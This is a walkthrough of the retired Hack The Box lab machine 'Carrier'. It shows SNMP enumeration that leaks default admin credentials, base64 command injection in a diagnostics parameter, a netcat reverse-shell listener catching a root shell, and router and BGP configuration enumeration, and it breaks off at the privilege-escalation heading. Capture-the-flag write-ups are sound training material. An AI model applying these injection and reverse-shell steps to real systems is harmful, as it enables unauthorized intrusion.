.
#### Background
Carrier is a retired vulnerable VM from Hack. This box is really fun since it allows us to play with some BGP Hijacking which i have not seen from any challenges i solved so far.


To begin the enumeration process, a TCP/UDP port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 

##### OS Information:
Based on the Apache version, it looks like we are dealing with Xenial / Ubuntu 16.04 based system.

###### Open Ports:
In addition to usual ports, 22 and 80 UDP port 161 is open. UDP 161 is the standard SNMP port.There is also a filtered ftp port showing.

![source-01](/img/Screenshot_2020-05-27_16-31-11.png){: .align-left}
Browsing to the site we see a login page with weird error messeges (Error 45007 and Error 45009). Lets start directory enumeration.

```python
➜  carrier wfuzz --hc=404 -z file,/usr/share/wordlists/dirb/common.txt http://10.10.10.105/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.105/FUZZ
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000000001:   200        63 L     105 W    1509 Ch     ""                                                                                                   
000000011:   403        11 L     32 W     291 Ch      ".hta"                                                                                               
000000012:   403        11 L     32 W     296 Ch      ".htaccess"                                                                                          
000000013:   403        11 L     32 W     296 Ch      ".htpasswd"                                                                                          
000001114:   301        9 L      28 W     310 Ch      "css"                                                                                                
000001196:   301        9 L      28 W     312 Ch      "debug"                                                                                              
000001313:   301        9 L      28 W     310 Ch      "doc"                                                                                                
000001648:   301        9 L      28 W     312 Ch      "fonts"                                                                                              
000001998:   301        9 L      28 W     310 Ch      "img"                                                                                                
000002021:   200        63 L     105 W    1509 Ch     "index.php"                                                                                          
000002179:   301        9 L      28 W     309 Ch      "js"                                                                                                 
000003588:   403        11 L     32 W     300 Ch      "server-status"                                                                                      
000004087:   301        9 L      28 W     312 Ch      "tools"                                                                                              


```

The directory enumeration reveals an interesting directory /doc which contains a network diagram and a usermanual.

Network diagram showing 3 different BGP autonomous systems.

>BGP is the protocol that makes the Internet work. It does this by enabling data routing on the Internet.BGP is responsible for looking at all of the available paths that data could travel and picking the best route, which usually means hopping between autonomous systems. 

![source-01](/img/diagram_for_tac.png){: .align-left}

Lyghtspeed networks AS 100 is connected to two other networks, AS 200 and AS 300.

Document Manual 

![source-01](/img/Screenshot_2020-05-27_16-49-23.png){: .align-left}

The “error_codes.pdf” contains explanations for different error codes, the weird error codes we saw earlier on webpage. One of those are 45009, which states that the admin still uses default credentials which are set to a “chassis serial number”

After further enumeration, i coudnt find the chassis serial number, so decided to move on and check SNMP service.

#### SNMP Enumeration:
```python

➜  carrier snmpwalk -c public 10.10.10.105 -v 1
Created directory: /var/lib/snmp/mib_indexes
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

Yes this look like the serial number we are looking for. Lets try to log in with credentials (admin:NET_45JDX23)

![source-01](/img/Screenshot_2020-05-27_17-08-58.png){: .align-left}

Ticket tab:

After going through the webpage.The ticket number 6 give us some information about VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... This might be important to us later !

![source-01](/img/Screenshot_2020-05-27_17-17-26.png){: .align-left}

Checking diag page:

![source-01](/img/Screenshot_2020-05-27_17-23-45.png){: .align-left}

Look like the server might be running “ps” command.


> Quagga is a routing software suite, providing implementations of OSPFv2, OSPFv3, RIP v1 and v2, RIPng and BGP-4 for Unix platforms, particularly FreeBSD, Linux, Solaris and NetBSD. Quagga is a fork of GNU Zebra which was developed by Kunihiro Ishiguro.

Exploitation:

Lets explore the web app further behavior in the burp suite. We can see check=some based64 encoded chars its sending.

![source-01](/img/Screenshot_2020-05-27_17-38-09.png){: .align-left}

Lets decode it and see what it is.

![source-01](/img/Screenshot_2020-05-27_17-39-13.png){: .align-left}

Decoding the base64 reveals it is sending the word quagga, And the web application is showing all the process that contains the string “quagga”. So that means the web application is maybe running “ps” with “grep quagga” command. Lets explore this futher and see if we can inject our own command to it and send. 

By changing the parameter to “id” and then encoding it with base64 encode and forward the request to the server.

![source-01](/img/Screenshot_2020-05-27_17-41-07.png){: .align-left}

And it works, we have command injection and it shows as root !!. It is even possible to get user.txt file before getting a reverseShell.

#### Exploitation:

Lets get a reverse shell back to our attacker machine for further exploitation.
I am going to send a simple bash shell encoded in base 64

![source-01](/img/Screenshot_2020-05-27_18-36-08.png){: .align-left}

Send the command inside the POST request via the check parameter. After executing it got a reverse Shell as root, but root flag is not here.

```python

➜  carrier nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.105] 51560
bash: cannot set terminal process group (2323): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@r1:~# ls
ls
test_intercept.pcap
user.txt
root@r1:~# cat user.txt
```


#### Network Enumeration:
So we are basically inside a router, by typing hostname it says we are in R1. Agine back to enumeration, we need to gather all the information we need to escalate our priviledges to root.

The router has three network interfaces:
+ eth0: 10.99.64.2/24
+ eth1: 10.78.10.1/24
+ eth2: 10.78.11.1/24

The arp table shows IP addresses from all of the networks listed above.

```python

root@r1:~# arp
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
10.99.64.1               ether   fe:3c:27:ea:df:39   C                     eth0
root@r1:~# 
```


Crontab:
```python

root@r1:~#     crontab -l
    crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /opt/restore.sh
root@r1:~# 
```
So there is a bash script in /opt/ directory called “restore.sh”
```python

root@r1:/opt# cat restore.sh
cat restore.sh
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```
This script restores the BGP configuration every 10 minutes and overwrite changes to the Quagga configuration. So basical if you want bring any changes to the BGP configuration for our attack we just need to change the permission of this restore.sh file.

Searching for quagga, we can see all configuration related it from /etc/quagga
```python

root@r1:~# cd /etc/quagga
cd /etc/quagga
root@r1:/etc/quagga# ls
ls
bgpd.conf
bgpd.conf.orig
bgpd.conf.sav
daemons
debian.conf
zebra.conf
zebra.conf.orig
zebra.conf.sav
root@r1:/etc/quagga# 
```
###### BGP Configuration:
```python

root@r1:~# cat /etc/quagga/bgpd.conf
cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

### BGP Hijacking - Priviledge Escalation




